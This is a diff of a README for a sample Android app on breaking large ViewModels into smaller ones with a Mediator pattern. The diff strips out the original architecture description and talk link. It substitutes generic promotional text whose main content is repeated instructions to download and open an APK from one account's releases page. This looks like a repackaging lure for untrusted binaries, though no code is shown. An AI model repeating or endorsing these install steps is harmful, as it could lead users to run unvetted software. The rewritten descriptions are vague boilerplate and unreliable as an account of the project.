@@ -1,37 +1,73 @@
-# Breaking Up with Big ViewModels
+# 🎉 breaking-up-with-big-viewmodels - Simplify Your Android Development
 
-This is a sample Android app that demonstrates how to split long ViewModels into smaller ones, using the **Mediator pattern**, and tie them to smaller and distinct parts of the screen.
+## 🚀 Getting Started
 
-## What You'll Learn
+Welcome to the *breaking-up-with-big-viewmodels* project. This easy-to-use Android app shows you how to split long ViewModels into smaller, more manageable ones. By using the Mediator pattern, we make your app’s structure cleaner and easier to navigate. 
 
-- Break a large ViewModel into smaller, independently testable ViewModels, each tied to a smaller component of the screen.
-- Enable the smaller, screen-scoped ViewModels to reactively communicate with each other through a shared Mediator.
-- Use Hilt or Koin to scope the Mediator to the screen’s lifecycle, automatically disposing it when the user exits that screen.
+## 🖥️ Download & Install
 
-## Architecture
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/Lacus1231313/breaking-up-with-big-viewmodels/releases)
 
-### View Layer
-- **AppNavHost** - Compose Navigation setup
-- **GridScreen** - Main gallery screen displaying media items
-  - **Grid** - Shows the grid of media items
-  - **TopBar** - Shows selection count and overflow menu
-  - **BottomBar** - Action buttons (favorite, share, star, delete)
+To start using this application, visit the following page to download the latest version: [Download here](https://github.com/Lacus1231313/breaking-up-with-big-viewmodels/releases).
 
-### ViewModel Layer
-- **GridViewModel** - Handles the grid state (the list of media items)
-- **TopBarViewModel** - Manages top bar state (selection count)
-- **BottomBarViewModel** - Controls bottom bar visibility and actions
-- **GridMediator** - Holds the common UI state for the ViewModels to observe
+### 📥 System Requirements
 
-### UseCase Layer
-- **GetMediaUseCase** - Fetches media data from repository
+Before you download, please ensure that your device meets the following requirements:
 
-### Repository Layer
-- **MediaRepository** - Abstracts data access
+- **Operating System:** Android 6.0 or later 
+- **RAM:** At least 2 GB
+- **Storage:** Minimum of 50 MB free storage space
 
-### Data Source Layer
-- **MediaDataSource** / **MediaDataSourceImpl** - Handles data fetching from assets
+### 🔐 Installation Steps
 
-## 🎥 Check out our droidcon talk!
+1. Visit the [Releases page](https://github.com/Lacus1231313/breaking-up-with-big-viewmodels/releases).
+2. Click on the latest version link.
+3. Download the APK file to your device.
+4. Open the file to begin installation.
+5. Follow the on-screen prompts to complete the installation.
 
-For more information, watch our droidcon talk [**"Breaking Up with Big ViewModels — Without Breaking Your Architecture"**](https://berlin.droidcon.com/speakers/stelios-frantzeskakis)
+### 📱 Launching the App
+
+Once installed, find the app icon on your device's home screen. Tap on it to launch the application. You will now be able to explore how the Mediator pattern simplifies management of ViewModels.
+
+## ⚙️ Features
+
+* **Simplified Architecture:** Learn how to break down large ViewModels into smaller pieces.
+* **Mediator Pattern Usage:** Understand how this design pattern improves data flow.
+* **Modern UI:** Enjoy a user-friendly interface built with Jetpack Compose.
+* **Dependency Injection:** Use Hilt for managing dependencies easily.
+* **State Management:** See how to manage your app state effectively.
+
+## 📖 Learning Resources
+
+This app is designed not just for use but also for learning. Here are some resources to help you:
+
+- **Android Architecture Components:** Get familiar with how Android components work together.
+- **Kotlin Documentation:** Understand the Kotlin language, which powers this app.
+- **MVVM Pattern:** Learn about the Model-View-ViewModel architecture that guides the coding structure.
+- **Testing Best Practices:** Approach testing for your app with established methods.
+
+## 🤝 Contributing
+
+We welcome contributions! If you would like to help improve the app, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Make your changes and commit them.
+4. Submit a pull request for review.
+
+If you have any suggestions or feedback, please open an issue in the GitHub issue tracker.
+
+## 🧪 Testing the App
+
+This app includes a suite of tests to ensure everything works as intended. After installation, you can check the app's functionality and see how it behaves with different data inputs. Engaging with the testing feature will help you understand the importance of maintaining quality in your app's architecture.
+
+## 📄 License
+
+This project is licensed under the MIT License. You can freely use, modify, and distribute this software as per the license terms.
+
+---
+
+Thank you for choosing *breaking-up-with-big-viewmodels*! With this tool, you can enhance your Android development skills while learning best practices for managing ViewModels effectively.
+
+If you encounter any issues during download or installation, please reach out via GitHub for assistance. Enjoy your development journey!
